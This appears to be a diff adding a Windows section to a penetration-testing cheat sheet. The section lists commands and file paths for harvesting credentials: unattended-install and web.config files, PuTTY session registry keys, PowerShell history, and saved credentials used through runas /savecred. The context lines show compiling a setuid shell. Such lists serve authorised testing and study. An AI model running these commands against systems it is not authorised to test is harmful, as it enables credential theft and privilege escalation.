@@ -317,6 +317,37 @@ sudo gcc main.c -o shell -w -static
 sudo chmod +s shell
 ````
 
+### Windows
+
+- Usefull files
+````
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+````
+
+- Powershell history
+````
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+````
+
+- Saved Windows Credentials
+````
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+````
+
+- RDP connexion
+````
+remmina
+````
+
 ### Usefull links :
 
 - [GTFOBINS](https://gtfobins.github.io/)
